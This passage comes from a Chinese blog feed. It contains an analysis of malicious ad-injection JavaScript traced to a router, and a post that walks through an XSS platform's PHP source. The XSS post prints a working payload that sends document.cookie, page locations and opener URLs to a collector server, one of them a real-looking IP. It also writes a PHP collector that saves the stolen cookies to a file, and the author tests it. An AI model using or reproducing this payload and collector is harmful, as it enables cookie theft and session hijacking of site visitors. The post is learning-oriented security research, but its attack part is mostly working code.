baiduReg = <span class="regexp">/m\.baidu\.com\/static/g</span>;</span><br><span class="line">        <span class="keyword">if</span>(reg.<span class="title function_">test</span>(url) || baiduReg.<span class="title function_">test</span>(url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loadJs</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> newscript = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    newscript.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">    newscript.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;https://www.jiubuhua.com/exjs.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> newscript2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    newscript2.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">    newscript2.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;http://bb.dugesheying.com/yhws/channel/yj/yjda.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> newscript3 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    newscript3.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">    newscript3.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;https://www.jiubuhua.com/9cc19.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newscript4 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        newscript4.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">        newscript4.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;https://logs.newapi.com/jd/ad?f=zq18&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> head = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">    head.<span class="title function_">appendChild</span>(newscript);</span><br><span class="line">    head.<span class="title function_">appendChild</span>(newscript2);</span><br><span class="line">    head.<span class="title function_">appendChild</span>(newscript3);</span><br><span class="line">head.<span class="title function_">appendChild</span>(newscript4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意到了代码中有几行</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/phicomm\.com/g</span>;</span><br><span class="line">        <span class="keyword">var</span> baiduReg = <span class="regexp">/m\.baidu\.com\/static/g</span>;</span><br><span class="line">        <span class="keyword">if</span>(reg.<span class="title function_">test</span>(url) || baiduReg.<span class="title function_">test</span>(url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不对斐讯和百度域名进行广告推送，笔者用的路由正是斐讯<br>随后对IP进行查询<br><img src="/images/rfkLGaX.png"><br>确定为路由器干的了</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol><li>上游设备对IP段<code>222.73.156.0/24</code>加黑</li><li>电脑开启防火墙，拉黑<code>222.73.156.0/24</code></li><li>刷机 参考<a href="http://www.qqgzs.com/archives/k2p-shuaji.html">斐讯K2P A1新版刷机链接</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Router </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS平台原理浅析</title>
      <link href="/p/4110562338.html"/>
      <url>/p/4110562338.html</url>
      
        <content type="html"><![CDATA[<p>之前一直对XSS平台传递原理很好奇 今天抽空看了下源码</p><span id="more"></span><p>先来看index.php</p><h1 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * index.php 默认页</span></span><br><span class="line"><span class="comment"> * ----------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * OldCMS,site:http://www.oldcms.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;init.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$do</span>=<span class="title function_ invoke__">Val</span>(<span class="string">&#x27;do&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dos</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;login&#x27;</span>,<span class="string">&#x27;project&#x27;</span>,<span class="string">&#x27;module&#x27;</span>,<span class="string">&#x27;code&#x27;</span>,<span class="string">&#x27;api&#x27;</span>,<span class="string">&#x27;do&#x27;</span>,<span class="string">&#x27;register&#x27;</span>,<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;keepsession&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$do</span>,<span class="variable">$dos</span>)) <span class="variable">$do</span>=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT_PATH.<span class="string">&#x27;/source/&#x27;</span>.<span class="variable">$do</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php是个入口，定义了do传进来的参数所包含的文件<br>由于对目标站和XSS平台间的传递好奇，所以看下api.php</p><h2 id="ctags插件"><a href="#ctags插件" class="headerlink" title="ctags插件"></a>ctags插件</h2><p>Sublime的一个很不错的插件 能快速定位函数调用位置<br><img src="/images/UHbe1mP.png"></p><h1 id="api-php"><a href="#api-php" class="headerlink" title="api.php"></a>api.php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * api.php 接口</span></span><br><span class="line"><span class="comment"> * ----------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * OldCMS,site:http://www.oldcms.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_OLDCMS&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">Val</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">Val 获得提交的值</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $namestring参数名</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $methodstring获取途径(GET/POST/COOKIE/REQUEST)</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $typestring/int过滤类型(&#x27;string&#x27;/0=&gt;string,&#x27;int&#x27;/1=&gt;int,其它/2=&gt;不过滤)</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $isArrayint0=&gt;非数组,1=&gt;数组</span></span><br><span class="line"><span class="comment"><span class="doctag">@return</span> $valuestring/int</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>) &#123;</span><br><span class="line">    <span class="variable">$db</span>      = <span class="title function_ invoke__">DBConnect</span>();</span><br><span class="line">    <span class="comment">//连接数据库</span></span><br><span class="line">    <span class="variable">$project</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">FirstRow</span>(<span class="string">&quot;SELECT * FROM &quot;</span> . <span class="title function_ invoke__">Tb</span>(<span class="string">&#x27;project&#x27;</span>) . <span class="string">&quot; WHERE urlKey=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">/* Tb 获取table name */</span></span><br><span class="line">    <span class="comment">//取所属项目第一行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$project</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//为空跳出</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//用户提供的content</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">//待接收的key</span></span><br><span class="line">    <span class="variable">$keys</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">/* 模块 begin */</span></span><br><span class="line">    <span class="variable">$moduleIds</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$project</span>[<span class="string">&#x27;modules&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">//模块不为空</span></span><br><span class="line">        <span class="variable">$moduleIds</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$project</span>[<span class="string">&#x27;modules&#x27;</span>]);</span><br><span class="line">        <span class="comment">//json解码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$moduleIds</span>)) &#123;</span><br><span class="line">        <span class="variable">$modulesStr</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$moduleIds</span>);<span class="comment">//把moduleIds转为字符串并以，隔开</span></span><br><span class="line">        <span class="variable">$modules</span>    = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">Dataset</span>(<span class="string">&quot;SELECT * FROM &quot;</span> . <span class="title function_ invoke__">Tb</span>(<span class="string">&#x27;module&#x27;</span>) . <span class="string">&quot; WHERE id IN (<span class="subst">$modulesStr</span>)&quot;</span>);</span><br><span class="line">        <span class="comment">//数据库查询所使用的一个或多个模块</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$modules</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$modules</span> <span class="keyword">as</span> <span class="variable">$module</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$module</span>[<span class="string">&#x27;keys&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$keys</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$keys</span>, <span class="title function_ invoke__">json_decode</span>(<span class="variable">$module</span>[<span class="string">&#x27;keys&#x27;</span>]));</span><br><span class="line">                    <span class="comment">//将待接收的location,toplocation,cookie,opener和模块的location,toplocation,cookie,opener组合成一个数组</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 模块 end */</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$keys</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">Val</span>(<span class="variable">$key</span>, <span class="string">&#x27;REQUEST&#x27;</span>);</span><br><span class="line">        <span class="comment">//接收location,toplocation,cookie,opener并赋值给$content</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;toplocation&#x27;</span>, <span class="variable">$keys</span>)) &#123;</span><br><span class="line">        <span class="variable">$content</span>[<span class="string">&#x27;toplocation&#x27;</span>] = !<span class="keyword">empty</span>(<span class="variable">$content</span>[<span class="string">&#x27;toplocation&#x27;</span>]) ? <span class="variable">$content</span>[<span class="string">&#x27;toplocation&#x27;</span>] : <span class="variable">$content</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line">        <span class="comment">//toplocation判断是否为空，为空则location否则为接收到的toplocation的值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$judgeCookie</span> = <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;cookie&#x27;</span>, <span class="variable">$keys</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//判断cookies是否存在于数组中</span></span><br><span class="line">    <span class="comment">/* cookie hash */</span></span><br><span class="line">    <span class="variable">$cookieHash</span>    = <span class="title function_ invoke__">md5</span>(<span class="variable">$project</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$content</span>[<span class="string">&#x27;cookie&#x27;</span>] . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$content</span>[<span class="string">&#x27;location&#x27;</span>] . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$content</span>[<span class="string">&#x27;toplocation&#x27;</span>]);</span><br><span class="line">    <span class="comment">//将项目id，接收的cookie，location，toplocation经过MD5后赋值给cookieHash</span></span><br><span class="line">    <span class="variable">$cookieExisted</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">FirstValue</span>(<span class="string">&quot;SELECT COUNT(*) FROM &quot;</span> . <span class="title function_ invoke__">Tb</span>(<span class="string">&#x27;project_content&#x27;</span>) . <span class="string">&quot; WHERE projectId=&#x27;<span class="subst">&#123;$project[id]&#125;</span>&#x27; AND cookieHash=&#x27;<span class="subst">&#123;$cookieHash&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//获取项目中的内容数量</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$judgeCookie</span> || <span class="variable">$cookieExisted</span> &lt;= <span class="number">0</span>) &#123;<span class="comment">//如果不存在这条cookie或hash不存在则执行</span></span><br><span class="line">        <span class="comment">//服务器获取的content</span></span><br><span class="line">        <span class="variable">$serverContent</span>                    = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$serverContent</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]    = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">        <span class="comment">//获取返回路径</span></span><br><span class="line">        <span class="variable">$referers</span>                         = @<span class="title function_ invoke__">parse_url</span>(<span class="variable">$serverContent</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">        <span class="comment">//获取http</span></span><br><span class="line">        <span class="variable">$domain</span>                           = <span class="variable">$referers</span>[<span class="string">&#x27;host&#x27;</span>] ? <span class="variable">$referers</span>[<span class="string">&#x27;host&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="comment">//返回域名</span></span><br><span class="line">        <span class="variable">$domain</span>                           = <span class="title function_ invoke__">StripStr</span>(<span class="variable">$domain</span>);</span><br><span class="line">        <span class="comment">//过滤处理域名</span></span><br><span class="line">        <span class="variable">$serverContent</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]    = <span class="title function_ invoke__">StripStr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">        <span class="variable">$serverContent</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] = <span class="title function_ invoke__">StripStr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line">        <span class="variable">$serverContent</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]     = <span class="title function_ invoke__">StripStr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$values</span>                           = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;projectId&#x27;</span>     =&gt; <span class="variable">$project</span>[<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>       =&gt; <span class="title function_ invoke__">JsonEncode</span>(<span class="variable">$content</span>),</span><br><span class="line">            <span class="string">&#x27;serverContent&#x27;</span> =&gt; <span class="title function_ invoke__">JsonEncode</span>(<span class="variable">$serverContent</span>),</span><br><span class="line">            <span class="string">&#x27;domain&#x27;</span>        =&gt; <span class="variable">$domain</span>,</span><br><span class="line">            <span class="string">&#x27;cookieHash&#x27;</span>    =&gt; <span class="variable">$cookieHash</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span>           =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;addTime&#x27;</span>       =&gt; <span class="title function_ invoke__">time</span>(),</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">AutoExecute</span>(<span class="title function_ invoke__">Tb</span>(<span class="string">&#x27;project_content&#x27;</span>), <span class="variable">$values</span>);</span><br><span class="line">        <span class="comment">//根据AutoExecute函数判断自动执行更新或插入</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">Execute</span>(<span class="string">&quot;UPDATE &quot;</span> . <span class="title function_ invoke__">Tb</span>(<span class="string">&#x27;project_content&#x27;</span>) . <span class="string">&quot; SET num=num+1,updateTime=&#x27;&quot;</span> . <span class="title function_ invoke__">time</span>() . <span class="string">&quot;&#x27; WHERE projectId=&#x27;<span class="subst">&#123;$project[id]&#125;</span>&#x27; AND cookieHash=&#x27;<span class="subst">&#123;$cookieHash&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="comment">//如果hash存在则执行同一项目的更新（增加）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$_SERVER</span>[HTTP_REFERER] &quot;</span>);</span><br><span class="line">    <span class="comment">//返回来路地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p>读完接口文件看看JS</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">              (<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span> = <span class="string">&#x27;http://XXX.XXX.XXX.XXX/test.php?location=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 新建图片，图片资源地址为你的XSS平台的接口地址</span></span><br><span class="line"><span class="comment">                 * 对下列内容编码</span></span><br><span class="line"><span class="comment">                 * 1、访问的完整路径</span></span><br><span class="line"><span class="comment">                 * 2、cookie</span></span><br><span class="line"><span class="comment">                 * 3、父页面对象</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">&#x27;&amp;toplocation=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> top.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">&#x27;&amp;cookie=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">&#x27;&amp;opener=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> (<span class="variable language_">window</span>.<span class="property">opener</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span>.<span class="property">href</span>) ? <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span>.<span class="property">href</span> : <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)());</span><br><span class="line">          &#125;)();</span><br><span class="line">          <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> == <span class="number">1</span>) &#123;</span><br><span class="line">              keep = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">              keep.<span class="property">src</span> = <span class="string">&#x27;http://47.100.191.127/test.php?url=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">location</span>) + <span class="string">&#x27;&amp;cookie=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br><span class="line">          &#125;;</span><br></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>至此对XSS平台传递原理有了大概了解，手头上正好有外网服务器，做个测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取信息测试</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$cookie</span>      = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$refer</span>       = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$location</span>    = <span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line"><span class="variable">$toplocation</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;toplocation&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span>         = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span>        = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>);</span><br><span class="line"><span class="variable">$testfile</span>    = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xsstest.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;文件打开失败!&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span>         = <span class="string">&quot;Cookies:&quot;</span> . <span class="variable">$cookie</span> . <span class="string">&quot;\r\n&quot;</span> . <span class="string">&quot;Refer:&quot;</span> . <span class="variable">$refer</span> . <span class="string">&quot;\r\n&quot;</span> . <span class="string">&quot;location:&quot;</span> . <span class="variable">$location</span> . <span class="string">&quot;\r\n&quot;</span> . <span class="string">&quot;Toplocation:&quot;</span> . <span class="variable">$toplocation</span> . <span class="string">&quot;\r\n&quot;</span> . <span class="string">&quot;Time:&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$testfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$testfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/Ae1Dc4V.png"></p><p>本地写个文件</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">              (<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span> = <span class="string">&#x27;http://XXXXX/test.php?location=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 新建图片，图片资源地址为你的XSS平台的接口地址</span></span><br><span class="line"><span class="comment">                 * 对下列内容编码</span></span><br><span class="line"><span class="comment">                 * 1、访问的完整路径</span></span><br><span class="line"><span class="comment">                 * 2、cookie</span></span><br><span class="line"><span class="comment">                 * 3、父页面对象</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">&#x27;&amp;toplocation=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> top.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">&#x27;&amp;cookie=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">&#x27;&amp;opener=&#x27;</span> + <span class="built_in">escape</span>((<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> (<span class="variable language_">window</span>.<span class="property">opener</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span>.<span class="property">href</span>) ? <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span>.<span class="property">href</span> : <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)());</span><br><span class="line">          &#125;)();</span><br><span class="line">          <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> == <span class="number">1</span>) &#123;</span><br><span class="line">              keep = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">              keep.<span class="property">src</span> = <span class="string">&#x27;http://XXXXX/test.php?url=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">location</span>) + <span class="string">&#x27;&amp;cookie=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br><span class="line">          &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问后不出意外会在服务器目录下生成<code>xsstest.txt</code>文件并记录相关信息<br><img src="/images/WQOvWVS.png"><br><img src="/images/jkdJ52S.png"><br>成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP服务器报错500调试方法</title>
      <link href="/p/332015673.html"/>
      <url>/p/332015673.html</url>
      
